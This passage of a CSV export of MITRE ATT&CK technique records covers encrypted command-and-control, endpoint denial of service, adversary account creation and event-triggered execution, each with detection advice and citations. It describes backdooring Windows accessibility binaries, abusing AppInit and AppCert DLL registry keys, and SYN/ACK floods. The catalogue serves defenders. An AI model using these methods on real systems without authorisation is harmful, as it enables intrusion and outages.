Zebrocy May 2019),(Citation: FoxIT Wocao December 2019),(Citation: Group IB Cobalt Aug 2017),(Citation: Accenture HyperStack October 2020),(Citation: US-CERT Volgmer Nov 2017),(Citation: CISA Zebrocy Oct 2020),(Citation: Kaspersky Sodin July 2019),(Citation: IBM Grandoreiro April 2020),(Citation: ESET Kobalos Feb 2021),(Citation: PWC WellMess C2 August 2020),(Citation: Juniper IcedID June 2020),(Citation: ESET Sednit Part 2),(Citation: CISA AR21-126A FIVEHANDS May 2021),(Citation: ESET ComRAT May 2020),(Citation: FireEye FIN6 April 2016),(Citation: FireEye APT29 Nov 2018),(Citation: Securelist WhiteBear Aug 2017),(Citation: CISA WellMail July 2020),(Citation: FireEye POSHSPY April 2017),(Citation: Gigamon BADHATCH Jul 2019),(Citation: Medium Metamorfo Apr 2020),(Citation: BlackBerry CostaRicto November 2020),(Citation: MSTIC NOBELIUM Mar 2021),(Citation: Leonardo Turla Penquin May 2020),(Citation: Cisco Operation Layover September 2021),(Citation: ESET Gazer Aug 2017),(Citation: Proofpoint TA505 Jan 2019),(Citation: Github Koadic),(Citation: CISA ComRAT Oct 2020),(Citation: Check Point Pay2Key November 2020),(Citation: Prevailion DarkWatchman 2021),(Citation: Trend Micro Emotet Jan 2019),(Citation: GitHub Pupy),(Citation: MalwareBytes WoodyRAT Aug 2022),(Citation: FireEye Know Your Enemy FIN8 Aug 2016),"
T1573.001,attack-pattern--24bfaeba-cb0d-4525-b3dc-507c77ecec41,Encrypted Channel: Symmetric Cryptography,"Adversaries may employ a known symmetric encryption algorithm to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol. Symmetric encryption algorithms use the same key for plaintext encryption and ciphertext decryption. Common symmetric encryption algorithms include AES, DES, 3DES, Blowfish, and RC4.",https://attack.mitre.org/techniques/T1573/001,16 March 2020,26 March 2020,enterprise-attack,1.0,Command and Control,"With symmetric encryption, it may be possible to obtain the algorithm and key from samples and use them to decode network traffic to detect malware communications signatures.

In general, analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.(Citation: University of Birmingham C2)","Linux, Windows, macOS",Network Traffic: Network Traffic Content,True,T1573,,,,,,,,"(Citation: CrowdStrike IceApple May 2022),(Citation: FireEye CARBANAK June 2017),(Citation: Bitdefender Sardonic Aug 2021),(Citation: Forcepoint Monsoon),(Citation: ESET Casbaneiro Oct 2019),(Citation: Microsoft DUBNIUM July 2016),(Citation: CISA WellMess July 2020),(Citation: Symantec Hydraq Jan 2010),(Citation: Trend Micro Tick November 2019),(Citation: Red Canary NETWIRE January 2020),(Citation: Talos Cobalt Strike September 2020),(Citation: JPCert PLEAD Downloader June 2018),(Citation: Unit 42 Lucifer June 2020),(Citation: Zscaler Higaisa 2020),(Citation: FireEye SUNBURST Backdoor December 2020),(Citation: Novetta Blockbuster),(Citation: Bitdefender APT28 Dec 2015),(Citation: SentinelOne Aoqin Dragon June 2022),(Citation: Novetta-Axiom),(Citation: McAfee Lazarus Nov 2020),(Citation: Sofacy Komplex Trojan),(Citation: Talos MuddyWater Jan 2022),(Citation: Check Point Warzone Feb 2020),(Citation: Proofpoint Azorult July 2018),(Citation: PaloAlto CardinalRat Apr 2017),(Citation: Kaspersky Cloud Atlas December 2014),(Citation: Malwarebytes KONNI Evolves Jan 2022),(Citation: Group IB GrimAgent July 2021),(Citation: Talos Frankenstein June 2019),(Citation: ESET Dukes October 2019),(Citation: Unit 42 SeaDuke 2015),(Citation: ESET Sednit Part 3),(Citation: FireEye APT30),(Citation: Recorded Future REDDELTA July 2020),(Citation: Check Point APT34 April 2021),(Citation: Baumgartner Naikon 2015),(Citation: Lunghi Iron Tiger Linux),(Citation: Nicolas Falliere, Liam O Murchu, Eric Chien February 2011),(Citation: PaloAlto NanoCore Feb 2016),(Citation: Talos Bisonal Mar 2020),(Citation: FireEye Poison Ivy),(Citation: FireEye APT33 Guardrail),(Citation: CheckPoint Bandook Nov 2020),(Citation: Dell Sakula),(Citation: Proofpoint TA459 April 2017),(Citation: GitHub QuasarRAT),(Citation: ESET Kobalos Jan 2021),(Citation: FireEye APT10 Sept 2018),(Citation: Trend Micro Iron Tiger April 2021),(Citation: Unit 42 PingPull Jun 2022),(Citation: CISA AppleJeus Feb 2021),(Citation: Bitdefender Trickbot C2 infra Nov 2020),(Citation: ESET Attor Oct 2019),(Citation: Kaspersky Carbanak),(Citation: Microsoft PLATINUM April 2016),(Citation: Proofpoint TA416 Europe March 2022),(Citation: Checkpoint IndigoZebra July 2021),(Citation: PWC WellMess July 2020),(Citation: Kaspersky Dridex May 2017),(Citation: Check Point APT35 CharmPower January 2022),(Citation: ESET Okrum July 2019),(Citation: Joint Cybersecurity Advisory AA23-129A Snake Malware May 2023),(Citation: CISA MAR-10288834-2.v1  TAINTEDSCRIBE MAY 2020),(Citation: ESET InvisiMole June 2018),(Citation: US-CERT FALLCHILL Nov 2017),(Citation: F-Secure Cosmicduke),(Citation: MSTIC FoggyWeb September 2021),(Citation: CISA MAR-10292089-1.v2 TAIDOOR August 2021),(Citation: Nccgroup Gh0st April 2018),(Citation: US-CERT Volgmer 2 Nov 2017),(Citation: Kaspersky Turla),(Citation: Moran 2014),(Citation: Secureworks BRONZE SILHOUETTE May 2023),(Citation: McAfee Lazarus Jul 2020),(Citation: GitHub Sliver Encryption),(Citation: CISA AR18-352A Quasar RAT December 2018),(Citation: ESET PipeMon May 2020),(Citation: SentinelLabs Metador Sept 2022),(Citation: Unit 42 Bisonal July 2018),(Citation: Bitdefender Naikon April 2021),(Citation: TrendMicro Patchwork Dec 2017),(Citation: Proofpoint TA505 Mar 2018),(Citation: FireEye APT29),(Citation: Palo Alto Networks BBSRAT),(Citation: Securelist APT10 March 2021),(Citation: ClearSky Lebanese Cedar Jan 2021),(Citation: Lotus Blossom Jun 2015),(Citation: Forcepoint Felismus Mar 2017),(Citation: ESET GreyEnergy Oct 2018),(Citation: ESET Machete July 2019),(Citation: Fidelis Hi-Zor),(Citation: US-CERT BADCALL),(Citation: Secureworks BRONZE BUTLER Oct 2017),(Citation: Unit42 BendyBear Feb 2021),(Citation: ESET Zebrocy May 2019),(Citation: Intezer HiddenWasp Map 2019),(Citation: FireEye APT28),(Citation: Proofpoint Bumblebee April 2022),(Citation: Accenture HyperStack October 2020),(Citation: Zscaler APT31 Covid-19 October 2020),(Citation: Palo Alto Comnie),(Citation: SentinelLabs Metador Technical Appendix Sept 2022),(Citation: Proofpoint LookBack Malware Aug 2019),(Citation: ESET Operation Groundbait),(Citation: Palo Alto OilRig May 2016),(Citation: Kaspersky QakBot September 2021),(Citation: ESET Kobalos Feb 2021),(Citation: PWC WellMess C2 August 2020),(Citation: Lotus Blossom Dec 2015),(Citation: Unit42 OceanLotus 2017),(Citation: Cybereason StrifeWater Feb 2022),(Citation: TrendMicro Taidoor),(Citation: ESET Sednit Part 2),(Citation: Chaos Stolen Backdoor),(Citation: CrowdStrike Putter Panda),(Citation: Palo Alto MoonWind March 2017),(Citation: US-CERT HOTCROISSANT February 2020),(Citation: JPCERT ChChes Feb 2017),(Citation: trendmicro xcsset xcode project 2020),(Citation: ESET Turla Mosquito Jan 2018),(Citation: Fidelis TrickBot Oct 2016),(Citation: Securelist WhiteBear Aug 2017),(Citation: PWC Cloud Hopper Technical Annex April 2017),(Citation: Mandiant Suspected Turla Campaign February 2023),(Citation: RotaJakiro 2021 netlab360 analysis),(Citation: JPCert TSCookie March 2018),(Citation: Symantec W32.Duqu),(Citation: US-CERT KEYMARBLE Aug 2018),(Citation: Mandiant No Easy Breach),(Citation: Scarlet Mimic Jan 2016),(Citation: Proofpoint ZeroT Feb 2017),(Citation: BlackBerry CostaRicto November 2020),(Citation: Carbon Black HotCroissant April 2020),(Citation: Novetta Winnti April 2015),(Citation: Kaspersky CactusPete Aug 2020),(Citation: Volexity Patchwork June 2018),(Citation: Unit42 RDAT July 2020),(Citation: ESET ForSSHe December 2018),(Citation: Rancor Unit42 June 2018),(Citation: US-CERT BLINDINGCAN Aug 2020),(Citation: ESET Ebury Feb 2014),(Citation: McAfee Lazarus Resurfaces Feb 2018),(Citation: ESET Gazer Aug 2017),(Citation: Chronicle Winnti for Linux May 2019),(Citation: FireEye APT10 April 2017),(Citation: Fidelis Turbo),(Citation: Palo Alto menuPass Feb 2017),(Citation: ESET RTM Feb 2017),(Citation: FireEye SMOKEDHAM June 2021),(Citation: Security Intelligence More Eggs Aug 2019),(Citation: Unit42 Azorult Nov 2018),(Citation: Citizen Lab Stealth Falcon May 2016),(Citation: Novetta Blockbuster Destructive Malware),(Citation: Villeneuve 2011),(Citation: MalwareBytes WoodyRAT Aug 2022),(Citation: McAfee GhostSecret),(Citation: ESET LightNeuron May 2019),(Citation: Cisco H1N1 Part 2),(Citation: NCC Group Team9 June 2020),"
T1499.003,attack-pattern--18cffc21-3260-437e-80e4-4ab8bf2ba5e9,Endpoint Denial of Service: Application Exhaustion Flood,"Adversaries may target resource intensive features of applications to cause a denial of service (DoS), denying availability to those applications. For example, specific features in web applications may be highly resource intensive. Repeated requests to those features may be able to exhaust system resources and deny access to the application or the server itself.(Citation: Arbor AnnualDoSreport Jan 2018)",https://attack.mitre.org/techniques/T1499/003,20 February 2020,25 March 2022,enterprise-attack,1.2,Impact,"Detection of Endpoint DoS can sometimes be achieved before the effect is sufficient to cause significant impact to the availability of the service, but such response time typically requires very aggressive monitoring and responsiveness. Typical network throughput monitoring tools such as netflow, SNMP, and custom scripts can be used to detect sudden increases in circuit utilization.(Citation: Cisco DoSdetectNetflow) Real-time, automated, and qualitative study of the network traffic can identify a sudden surge in one type of protocol can be used to detect an attack as it starts.

In addition to network level detections, endpoint logging and instrumentation can be useful for detection. Attacks targeting web applications may generate logs in the web server, application server, and/or database server that can be used to identify the type of attack, possibly before the impact is felt.","Azure AD, Google Workspace, IaaS, Linux, Office 365, SaaS, Windows, macOS","Application Log: Application Log Content, Network Traffic: Network Traffic Content, Network Traffic: Network Traffic Flow, Sensor Health: Host Status",True,T1499,,,,,,Availability,,",(Citation: CERT-EU DDoS March 2017)"
T1499.004,attack-pattern--2bee5ffb-7a7a-4119-b1f2-158151b19ac0,Endpoint Denial of Service: Application or System Exploitation,"Adversaries may exploit software vulnerabilities that can cause an application or system to crash and deny availability to users. (Citation: Sucuri BIND9 August 2015) Some systems may automatically restart critical applications and services when crashes occur, but they can likely be re-exploited to cause a persistent denial of service (DoS) condition.

Adversaries may exploit known or zero-day vulnerabilities to crash applications and/or systems, which may also lead to dependent applications and/or systems to be in a DoS condition. Crashed or restarted applications or systems may also have other effects such as [Data Destruction](https://attack.mitre.org/techniques/T1485), [Firmware Corruption](https://attack.mitre.org/techniques/T1495), [Service Stop](https://attack.mitre.org/techniques/T1489) etc. which may further cause a DoS condition and deny availability to critical information, applications and/or systems. ",https://attack.mitre.org/techniques/T1499/004,20 February 2020,25 March 2022,enterprise-attack,1.2,Impact,"Attacks targeting web applications may generate logs in the web server, application server, and/or database server that can be used to identify the type of attack. Externally monitor the availability of services that may be targeted by an Endpoint DoS.","Azure AD, Google Workspace, IaaS, Linux, Office 365, SaaS, Windows, macOS","Application Log: Application Log Content, Network Traffic: Network Traffic Content, Network Traffic: Network Traffic Flow, Sensor Health: Host Status",True,T1499,,,,,,Availability,,"(Citation: ESET Industroyer),(Citation: CERT-EU DDoS March 2017)"
T1499.001,attack-pattern--0df05477-c572-4ed6-88a9-47c581f548f7,Endpoint Denial of Service: OS Exhaustion Flood,"Adversaries may launch a denial of service (DoS) attack targeting an endpoint's operating system (OS). A system's OS is responsible for managing the finite resources as well as preventing the entire system from being overwhelmed by excessive demands on its capacity. These attacks do not need to exhaust the actual resources on a system; the attacks may simply exhaust the limits and available resources that an OS self-imposes.

Different ways to achieve this exist, including TCP state-exhaustion attacks such as SYN floods and ACK floods.(Citation: Arbor AnnualDoSreport Jan 2018) With SYN floods, excessive amounts of SYN packets are sent, but the 3-way TCP handshake is never completed. Because each OS has a maximum number of concurrent TCP connections that it will allow, this can quickly exhaust the ability of the system to receive new requests for TCP connections, thus preventing access to any TCP service provided by the server.(Citation: Cloudflare SynFlood)

ACK floods leverage the stateful nature of the TCP protocol. A flood of ACK packets are sent to the target. This forces the OS to search its state table for a related TCP connection that has already been established. Because the ACK packets are for connections that do not exist, the OS will have to search the entire state table to confirm that no match exists. When it is necessary to do this for a large flood of packets, the computational requirements can cause the server to become sluggish and/or unresponsive, due to the work it must do to eliminate the rogue ACK packets. This greatly reduces the resources available for providing the targeted service.(Citation: Corero SYN-ACKflood)",https://attack.mitre.org/techniques/T1499/001,20 February 2020,30 March 2023,enterprise-attack,1.2,Impact,"Detection of Endpoint DoS can sometimes be achieved before the effect is sufficient to cause significant impact to the availability of the service, but such response time typically requires very aggressive monitoring and responsiveness. Typical network throughput monitoring tools such as netflow, SNMP, and custom scripts can be used to detect sudden increases in circuit utilization.(Citation: Cisco DoSdetectNetflow) Real-time, automated, and qualitative study of the network traffic can identify a sudden surge in one type of protocol can be used to detect an attack as it starts.","Linux, Windows, macOS","Network Traffic: Network Traffic Content, Network Traffic: Network Traffic Flow, Sensor Health: Host Status",True,T1499,,,,,,Availability,,",(Citation: CERT-EU DDoS March 2017)"
T1499.002,attack-pattern--38eb0c22-6caf-46ce-8869-5964bd735858,Endpoint Denial of Service: Service Exhaustion Flood,"Adversaries may target the different network services provided by systems to conduct a denial of service (DoS). Adversaries often target the availability of DNS and web services, however others have been targeted as well.(Citation: Arbor AnnualDoSreport Jan 2018) Web server software can be attacked through a variety of means, some of which apply generally while others are specific to the software being used to provide the service.

One example of this type of attack is known as a simple HTTP flood, where an adversary sends a large number of HTTP requests to a web server to overwhelm it and/or an application that runs on top of it. This flood relies on raw volume to accomplish the objective, exhausting any of the various resources required by the victim software to provide the service.(Citation: Cloudflare HTTPflood)

Another variation, known as a SSL renegotiation attack, takes advantage of a protocol feature in SSL/TLS. The SSL/TLS protocol suite includes mechanisms for the client and server to agree on an encryption algorithm to use for subsequent secure connections. If SSL renegotiation is enabled, a request can be made for renegotiation of the crypto algorithm. In a renegotiation attack, the adversary establishes a SSL/TLS connection and then proceeds to make a series of renegotiation requests. Because the cryptographic renegotiation has a meaningful cost in computation cycles, this can cause an impact to the availability of the service when done in volume.(Citation: Arbor SSLDoS April 2012)",https://attack.mitre.org/techniques/T1499/002,20 February 2020,30 March 2023,enterprise-attack,1.3,Impact,"Detection of Endpoint DoS can sometimes be achieved before the effect is sufficient to cause significant impact to the availability of the service, but such response time typically requires very aggressive monitoring and responsiveness. Typical network throughput monitoring tools such as netflow, SNMP, and custom scripts can be used to detect sudden increases in circuit utilization.(Citation: Cisco DoSdetectNetflow) Real-time, automated, and qualitative study of the network traffic can identify a sudden surge in one type of protocol can be used to detect an attack as it starts.

In addition to network level detections, endpoint logging and instrumentation can be useful for detection. Attacks targeting web applications may generate logs in the web server, application server, and/or database server that can be used to identify the type of attack, possibly before the impact is felt.

Externally monitor the availability of services that may be targeted by an Endpoint DoS.","Azure AD, Google Workspace, IaaS, Linux, Office 365, SaaS, Windows, macOS","Application Log: Application Log Content, Network Traffic: Network Traffic Content, Network Traffic: Network Traffic Flow, Sensor Health: Host Status",True,T1499,,,,,,Availability,,",(Citation: CERT-EU DDoS March 2017)"
T1585.003,attack-pattern--926d8cfd-1d0d-4da2-ab49-3ca10ec3f3b5,Establish Accounts: Cloud Accounts,"Adversaries may create accounts with cloud providers that can be used during targeting. Adversaries can use cloud accounts to further their operations, including leveraging cloud storage services such as Dropbox, MEGA, Microsoft OneDrive, or AWS S3 buckets for [Exfiltration to Cloud Storage](https://attack.mitre.org/techniques/T1567/002) or to [Upload Tool](https://attack.mitre.org/techniques/T1608/002)s. Cloud accounts can also be used in the acquisition of infrastructure, such as [Virtual Private Server](https://attack.mitre.org/techniques/T1583/003)s or [Serverless](https://attack.mitre.org/techniques/T1583/007) infrastructure. Establishing cloud accounts may allow adversaries to develop sophisticated capabilities without managing their own servers.(Citation: Awake Security C2 Cloud)

Creating [Cloud Accounts](https://attack.mitre.org/techniques/T1585/003) may also require adversaries to establish [Email Accounts](https://attack.mitre.org/techniques/T1585/002) to register with the cloud provider. ",https://attack.mitre.org/techniques/T1585/003,27 May 2022,25 October 2022,enterprise-attack,1.1,Resource Development,"Much of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on related stages of the adversary lifecycle, such as during exfiltration (ex: [Transfer Data to Cloud Account](https://attack.mitre.org/techniques/T1537)).",PRE,,True,T1585,,Francesco Bigarella,,,,,,","
T1585.002,attack-pattern--65013dd2-bc61-43e3-afb5-a14c4fa7437a,Establish Accounts: Email Accounts,"Adversaries may create email accounts that can be used during targeting. Adversaries can use accounts created with email providers to further their operations, such as leveraging them to conduct [Phishing for Information](https://attack.mitre.org/techniques/T1598) or [Phishing](https://attack.mitre.org/techniques/T1566).(Citation: Mandiant APT1) Adversaries may also take steps to cultivate a persona around the email account, such as through use of [Social Media Accounts](https://attack.mitre.org/techniques/T1585/001), to increase the chance of success of follow-on behaviors. Created email accounts can also be used in the acquisition of infrastructure (ex: [Domains](https://attack.mitre.org/techniques/T1583/001)).(Citation: Mandiant APT1)

To decrease the chance of physically tying back operations to themselves, adversaries may make use of disposable email services.(Citation: Trend Micro R980 2016)",https://attack.mitre.org/techniques/T1585/002,01 October 2020,15 April 2021,enterprise-attack,1.0,Resource Development,"Much of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access (ex: [Phishing](https://attack.mitre.org/techniques/T1566)).",PRE,,True,T1585,,,,,,,,"(Citation: Google EXOTIC LILY March 2022),(Citation: FoxIT Wocao December 2019),(Citation: IBM ITG18 2020),(Citation: Kaspersky ThreatNeedle Feb 2021),(Citation: ESET Lazarus Jun 2020),(Citation: US District Court Indictment GRU Unit 74455 October 2020),(Citation: Mandiant FIN12 Oct 2021),(Citation: Kaspersky Lyceum October 2021),(Citation: McAfee Honeybee),(Citation: Mandiant APT1),(Citation: Bitdefender FunnyDream Campaign November 2020),(Citation: Proofpoint TA453 March 2021),(Citation: CISA AA21-200A APT40 July 2021),(Citation: KISA Operation Muzabi),(Citation: Cylance Dust Storm),(Citation: Crowdstrike Indrik November 2018),(Citation: Proofpoint TA416 Europe March 2022),(Citation: DOJ Iran Indictments March 2018),"
T1585.001,attack-pattern--b1ccd744-3f78-4a0e-9bb2-2002057f7928,Establish Accounts: Social Media Accounts,"Adversaries may create and cultivate social media accounts that can be used during targeting. Adversaries can create social media accounts that can be used to build a persona to further operations. Persona development consists of the development of public information, presence, history and appropriate affiliations.(Citation: NEWSCASTER2014)(Citation: BlackHatRobinSage)

For operations incorporating social engineering, the utilization of a persona on social media may be important. These personas may be fictitious or impersonate real people. The persona may exist on a single social media site or across multiple sites (ex: Facebook, LinkedIn, Twitter, etc.). Establishing a persona  on social media may require development of additional documentation to make them seem real. This could include filling out profile information, developing social networks, or incorporating photos. 

Once a persona has been developed an adversary can use it to create connections to targets of interest. These connections may be direct or may include trying to connect through others.(Citation: NEWSCASTER2014)(Citation: BlackHatRobinSage) These accounts may be leveraged during other phases of the adversary lifecycle, such as during Initial Access (ex: [Spearphishing via Service](https://attack.mitre.org/techniques/T1566/003)).",https://attack.mitre.org/techniques/T1585/001,01 October 2020,16 October 2021,enterprise-attack,1.1,Resource Development,"Consider monitoring social media activity related to your organization. Suspicious activity may include personas claiming to work for your organization or recently created/modified accounts making numerous connection requests to accounts affiliated with your organization.

Detection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access (ex: [Spearphishing via Service](https://attack.mitre.org/techniques/T1566/003)).",PRE,"Network Traffic: Network Traffic Content, Persona: Social Media",True,T1585,,,,,,,,"(Citation: Google EXOTIC LILY March 2022),(Citation: ClearSky Pay2Kitten December 2020),(Citation: ESET Lazarus Jun 2020),(Citation: Microsoft Iranian Threat Actor Trends November 2021),(Citation: ClearSky Lazarus Aug 2020),(Citation: US District Court Indictment GRU Unit 74455 October 2020),(Citation: ClearSky Siamesekitten August 2021),(Citation: Google TAG Lazarus Jan 2021),(Citation: Volexity Ocean Lotus November 2020),(Citation: CISA AA21-200A APT40 July 2021),(Citation: KISA Operation Muzabi),(Citation: ESET Dukes October 2019),(Citation: Dell Threat Group 2889),(Citation: ClearSky Kittens Back 3 August 2020),"
T1546.008,attack-pattern--70e52b04-2a0c-4cea-9d18-7149f1df9dc5,Event Triggered Execution: Accessibility Features,"Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by accessibility features. Windows contains accessibility features that may be launched with a key combination before a user has logged in (ex: when the user is on the Windows logon screen). An adversary can modify the way these programs are launched to get a command prompt or backdoor without logging in to the system.

Two common accessibility programs are <code>C:\Windows\System32\sethc.exe</code>, launched when the shift key is pressed five times and <code>C:\Windows\System32\utilman.exe</code>, launched when the Windows + U key combination is pressed. The sethc.exe program is often referred to as ""sticky keys"", and has been used by adversaries for unauthenticated access through a remote desktop login screen. (Citation: FireEye Hikit Rootkit)

Depending on the version of Windows, an adversary may take advantage of these features in different ways. Common methods used by adversaries include replacing accessibility feature binaries or pointers/references to these binaries in the Registry. In newer versions of Windows, the replaced binary needs to be digitally signed for x64 systems, the binary must reside in <code>%systemdir%\</code>, and it must be protected by Windows File or Resource Protection (WFP/WRP). (Citation: DEFCON2016 Sticky Keys) The [Image File Execution Options Injection](https://attack.mitre.org/techniques/T1546/012) debugger method was likely discovered as a potential workaround because it does not require the corresponding accessibility feature binary to be replaced.

For simple binary replacement on Windows XP and later as well as and Windows Server 2003/R2 and later, for example, the program (e.g., <code>C:\Windows\System32\utilman.exe</code>) may be replaced with ""cmd.exe"" (or another program that provides backdoor access). Subsequently, pressing the appropriate key combination at the login screen while sitting at the keyboard or when connected over [Remote Desktop Protocol](https://attack.mitre.org/techniques/T1021/001) will cause the replaced file to be executed with SYSTEM privileges. (Citation: Tilbury 2014)

Other accessibility features exist that may also be leveraged in a similar fashion: (Citation: DEFCON2016 Sticky Keys)(Citation: Narrator Accessibility Abuse)

* On-Screen Keyboard: <code>C:\Windows\System32\osk.exe</code>
* Magnifier: <code>C:\Windows\System32\Magnify.exe</code>
* Narrator: <code>C:\Windows\System32\Narrator.exe</code>
* Display Switcher: <code>C:\Windows\System32\DisplaySwitch.exe</code>
* App Switcher: <code>C:\Windows\System32\AtBroker.exe</code>",https://attack.mitre.org/techniques/T1546/008,24 January 2020,21 April 2023,enterprise-attack,1.1,"Persistence, Privilege Escalation","Changes to accessibility utility binaries or binary paths that do not correlate with known software, patch cycles, etc., are suspicious. Command line invocation of tools capable of modifying the Registry for associated keys are also suspicious. Utility arguments and the binaries themselves should be monitored for changes. Monitor Registry keys within <code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options</code>.",Windows,"Command: Command Execution, File: File Creation, File: File Modification, Process: Process Creation, Windows Registry: Windows Registry Key Modification",True,T1546,,"Paul Speulstra, AECOM Global Security Operations Center",Administrator,,,,SYSTEM,"(Citation: CISA AA20-259A Iran-Based Actor September 2020),(Citation: FireEye APT29 Domain Fronting),(Citation: Mandiant No Easy Breach),(Citation: FireEye APT41 Aug 2019),(Citation: RSA Shell Crew),(Citation: Github PowerShell Empire),(Citation: aptsim),(Citation: Novetta-Axiom),(Citation: TechNet RDP NLA),(Citation: Windows Commands JPCERT),(Citation: Beechey 2010),(Citation: Corio 2008),(Citation: NSA MS AppLocker),(Citation: Microsoft Windows Defender Application Control),(Citation: TechNet RDP Gateway),(Citation: TechNet Applocker vs SRP)"
T1546.009,attack-pattern--7d57b371-10c2-45e5-b3cc-83a8fb380e4c,Event Triggered Execution: AppCert DLLs,"Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by AppCert DLLs loaded into processes. Dynamic-link libraries (DLLs) that are specified in the <code>AppCertDLLs</code> Registry key under <code>HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager\</code> are loaded into every process that calls the ubiquitously used application programming interface (API) functions <code>CreateProcess</code>, <code>CreateProcessAsUser</code>, <code>CreateProcessWithLoginW</code>, <code>CreateProcessWithTokenW</code>, or <code>WinExec</code>. (Citation: Elastic Process Injection July 2017)

Similar to [Process Injection](https://attack.mitre.org/techniques/T1055), this value can be abused to obtain elevated privileges by causing a malicious DLL to be loaded and run in the context of separate processes on the computer. Malicious AppCert DLLs may also provide persistence by continuously being triggered by API activity. ",https://attack.mitre.org/techniques/T1546/009,24 January 2020,10 November 2020,enterprise-attack,1.0,"Persistence, Privilege Escalation","Monitor DLL loads by processes, specifically looking for DLLs that are not recognized or not normally loaded into a process. Monitor the AppCertDLLs Registry value for modifications that do not correlate with known software, patch cycles, etc. Monitor and analyze application programming interface (API) calls that are indicative of Registry edits such as RegCreateKeyEx and RegSetValueEx. (Citation: Elastic Process Injection July 2017) 

Tools such as Sysinternals Autoruns may overlook AppCert DLLs as an auto-starting location. (Citation: TechNet Autoruns) (Citation: Sysinternals AppCertDlls Oct 2007)

Look for abnormal process behavior that may be due to a process loading a malicious DLL. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as making network connections for Command and Control, learning details about the environment through Discovery, and conducting Lateral Movement.",Windows,"Command: Command Execution, Module: Module Load, Process: OS API Execution, Process: Process Creation, Windows Registry: Windows Registry Key Modification",True,T1546,,,"Administrator, SYSTEM",,,,"Administrator, SYSTEM","(Citation: FireEye Know Your Enemy FIN8 Aug 2016),(Citation: Windows Commands JPCERT),(Citation: Beechey 2010),(Citation: Corio 2008),(Citation: NSA MS AppLocker),(Citation: Microsoft Windows Defender Application Control),(Citation: TechNet Applocker vs SRP)"
T1546.010,attack-pattern--cc89ecbd-3d33-4a41-bcca-001e702d18fd,Event Triggered Execution: AppInit DLLs,"Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by AppInit DLLs loaded into processes. Dynamic-link libraries (DLLs) that are specified in the <code>AppInit_DLLs</code> value in the Registry keys <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Windows</code> or <code>HKEY_LOCAL_MACHINE\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Windows</code> are loaded by user32.dll into every process that loads user32.dll. In practice this is nearly every program, since user32.dll is a very common library. (Citation: Elastic Process Injection July 2017)

Similar to Process Injection, these values can be abused to obtain elevated privileges by causing a malicious DLL to be loaded and run in the context of separate processes on the computer. (Citation: AppInit Registry) Malicious AppInit DLLs may also provide persistence by continuously being triggered by API activity. 

The AppInit DLL functionality is disabled in Windows 8 and later versions when secure boot is enabled. (Citation: AppInit Secure Boot)",https://attack.mitre.org/techniques/T1546/010,24 January 2020,21 April 2023,enterprise-attack,1.1,"Persistence, Privilege Escalation","Monitor DLL loads by processes that load user32.dll and look for DLLs that are not recognized or not normally loaded into a process. Monitor the AppInit_DLLs Registry values for modifications that do not correlate with known software, patch cycles, etc. Monitor and analyze application programming interface (API) calls that are indicative of Registry edits such as <code>RegCreateKeyEx</code> and <code>RegSetValueEx</code>. (Citation: Elastic Process Injection July 2017)

Tools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence, including listing current AppInit DLLs. (Citation: TechNet Autoruns) 

Look for abnormal process behavior that may be due to a process loading a malicious DLL. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as making network connections for Command and Control, learning details about the environment through Discovery, and conducting Lateral Movement.",Windows,"Command: Command Execution, Module: Module Load, Process: OS API Execution, Process: Process Creation, Windows Registry: Windows Registry Key Modification",True,T1546,,,Administrator,,Secure boot disabled on systems running Windows 8 and later,,"Administrator, SYSTEM","(Citation: Palo Alto T9000 Feb 2016),(Citation: Eset Ramsay May 2020),(Citation: Trustwave Cherry Picker),(Citation: FBI FLASH APT39 September 2020),(Citation: Windows Commands JPCERT),(Citation: Beechey 2010),(Citation: Corio 2008),(Citation: NSA MS AppLocker),(Citation: Microsoft Windows Defender Application Control),(Citation: TechNet Applocker vs SRP)"
T1546.011,attack-pattern--42fe883a-21ea-4cfb-b94a-78b6476dcc83,Event Triggered Execution: Application Shimming,"Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by application shims. The Microsoft Windows Application Compatibility Infrastructure/Framework (Application Shim) was created to allow for backward compatibility of software as the operating system codebase changes over time. For example, the application shimming feature allows developers to apply fixes to applications (without rewriting code) that were created for Windows XP so that it will work with Windows 10. (Citation: Elastic Process Injection July 2017)

Within the framework, shims are created to act as a buffer between the program (or more specifically, the Import Address Table) and the Windows OS. When a program is executed, the shim cache is referenced to determine if the program requires the use of the shim database (.sdb). If so, the shim database uses hooking to redirect the code as necessary in order to communicate with the OS. 

A list of all shims currently installed by the default Windows installer (sdbinst.exe) is kept in:

* <code>%WINDIR%\AppPatch\sysmain.sdb</code> and
* <code>hklm\software\microsoft\windows nt\currentversion\appcompatflags\installedsdb</code>

Custom databases are stored in:

* <code>%WINDIR%\AppPatch\custom & %WINDIR%\AppPatch\AppPatch64\Custom</code> and
* <code>hklm\software\microsoft\windows nt\currentversion\appcompatflags\custom</code>

To keep shims secure, Windows designed them to run in user mode so they cannot modify the kernel and you must have administrator privileges to install a shim. However, certain shims can be used to [Bypass User Account Control](https://attack.mitre.org/techniques/T1548/002) (UAC and RedirectEXE), inject DLLs into processes (InjectDLL), disable Data Execution Prevention (DisableNX) and Structure Exception Handling (DisableSEH), and intercept memory addresses (GetProcAddress).

